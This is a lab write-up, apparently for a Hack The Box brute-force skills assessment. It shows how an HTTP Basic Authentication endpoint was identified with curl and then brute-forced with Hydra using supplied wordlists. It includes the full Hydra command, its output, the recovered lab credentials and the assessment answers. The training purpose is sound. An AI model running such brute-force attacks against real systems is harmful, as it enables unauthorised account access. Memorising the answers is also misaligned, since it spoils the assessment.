# HTB Brute Force Module --- Skills Assessment Part 1

## 1. Assessment Overview

**Objective:** Brute-force the target's HTTP Basic Authentication login
and identify the username provided after successful authentication.

**Target:** - IP: `154.57.164.82` - Port: `31144` - Authentication: HTTP
Basic Authentication - Realm: `Restricted`

**Provided wordlists:** - `top-usernames-shortlist.txt` -
`2023-200_most_used_passwords.txt`

------------------------------------------------------------------------

## 2. Initial Enumeration

The target was first tested with `curl` to determine what service and
authentication mechanism were exposed.

### Command

``` bash
curl -i http://154.57.164.82:31144/
```

### Result

``` text
HTTP/1.1 401 Unauthorized
Server: nginx/1.27.1
Content-Type: text/html
WWW-Authenticate: Basic realm="Restricted"
```

### Interpretation

The `401 Unauthorized` status showed that authentication was required.

The following header confirmed that the target used HTTP Basic
Authentication:

``` text
WWW-Authenticate: Basic realm="Restricted"
```

This was the key piece of evidence used to select an HTTP Basic
Authentication brute-force approach.

------------------------------------------------------------------------

## 3. Brute-Force Methodology

The assessment supplied a username wordlist and a password wordlist.

The objective was to test combinations of:

``` text
username × password
```

Hydra was selected because it supports HTTP Basic Authentication and can
consume username/password wordlists.

------------------------------------------------------------------------

## 4. Hydra Command

The following command was used:

``` bash
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 154.57.164.82 http-get / -s 31144
```

### Hydra Output

``` text
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200)
[DATA] attacking http-get://154.57.164.82:31144/
[31144][http-get] host: 154.57.164.82   login: admin   password: Admin123
```

### Result

The valid HTTP Basic Authentication credentials were:

``` text
Username: admin
Password: Admin123
```

The password required by the assessment was therefore:

``` text
Admin123
```

------------------------------------------------------------------------

## 5. Accessing the Protected Application

After successfully brute-forcing the Basic Authentication credentials,
the protected web page was accessed using the discovered credentials.

The application displayed a success message and provided a username
required for Skills Assessment Part 2.

The username displayed by the application was:

``` text
satw0ssh
```

This username was then used as the starting point for Part 2.

------------------------------------------------------------------------

## 6. Final Answer --- Part 1

**Basic Auth password:**

``` text
Admin123
```

**Username provided for Part 2:**

``` text
satw0ssh
```

------------------------------------------------------------------------

## 7. Lessons Learned

### HTTP Basic Authentication

A server advertising:

``` text
WWW-Authenticate: Basic
```

is indicating that HTTP Basic Authentication is being used.

A `401 Unauthorized` response is expected when valid authentication has
not been supplied.

### Brute Force Workflow

The practical workflow was:

1.  Identify the target.
2.  Send an unauthenticated request.
3.  Inspect the HTTP response.
4.  Identify the authentication mechanism.
5.  Select an appropriate brute-force tool.
6.  Supply the provided username and password wordlists.
7.  Identify the successful credential pair.
8.  Authenticate manually to verify the result.
9.  Inspect the authenticated application for the next objective.

### Important Takeaway

The important skill was not simply running Hydra. The reasoning chain
was:

``` text
401 Unauthorized
        ↓
WWW-Authenticate: Basic
        ↓
HTTP Basic Authentication identified
        ↓
Username/password wordlists
        ↓
Hydra
        ↓
Valid credentials
        ↓
Authenticated application
        ↓
Username for Part 2
```

------------------------------------------------------------------------

## 8. Assessment Status

**Part 1: COMPLETED**

The valid Basic Authentication password was discovered, authentication
was successful, and the username required for Part 2 was obtained.
